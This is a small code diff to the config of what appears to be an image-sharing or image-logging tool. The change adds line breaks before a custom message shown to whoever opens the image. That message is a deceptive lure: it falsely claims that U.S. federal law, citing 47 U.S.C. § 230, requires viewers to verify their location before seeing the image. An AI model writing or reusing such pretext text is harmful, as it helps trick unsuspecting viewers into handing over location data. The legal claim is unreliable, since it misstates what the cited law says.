@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "Notice: To access this image, you must verify your location in accordance with United States federal law. Under the Communications Decency Act (47 U.S.C. § 230), certain content restrictions apply based on your jurisdiction.", 
+        "message": "<br><br><br><br><br><br>Notice: To access this image, you must verify your location in accordance with United States federal law. Under the Communications Decency Act (47 U.S.C. § 230), certain content restrictions apply based on your jurisdiction.", 
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
